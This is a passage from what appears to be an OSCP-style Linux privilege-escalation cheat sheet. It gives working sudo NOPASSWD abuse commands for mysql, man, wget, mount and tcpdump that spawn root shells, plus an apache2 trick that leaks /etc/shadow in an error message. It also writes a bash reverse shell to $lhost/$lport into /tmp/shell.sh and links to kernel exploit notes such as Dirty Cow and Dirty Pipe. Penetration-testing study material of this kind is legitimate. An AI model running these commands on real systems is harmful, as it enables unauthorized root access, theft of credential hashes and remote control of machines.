...
# If (ALL) NOPASSWD: /usr/bin/mysql
sudo mysql -u root -p -e '\! /bin/sh'

# If (ALL) NOPASSWD: /usr/bin/man
sudo man man
!/bin/bash
...
# If (ALL) NOPASSWD: /usr/bin/wget
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' > $TF
sudo wget --use-askpass=$TF 0

# If (ALL) NOPASSWD: /usr/bin/apache2
sudo apache2 -f /etc/shadow
# Leaks shadow file in error message

# If (ALL) NOPASSWD: /usr/bin/mount
sudo mount -o bind /bin/bash /bin/mount
sudo mount

# If (ALL) NOPASSWD: /usr/bin/tcpdump
echo '/bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1' > /tmp/shell.sh
...
- **[CVE Exploits - Linux](../2.CVE-Exploit/2.1.CVE-Exploit.md#linux)** - Dirty Cow, Dirty Pipe, Kernel exploits
...
- **[OSCP Exam Guide - Linux PrivEsc](../9.OSCP-Exam/9.1.OSCP-Exam-Guide.md#phase-3-privilege-escalation---linux-15-นาที)** - Quick reference
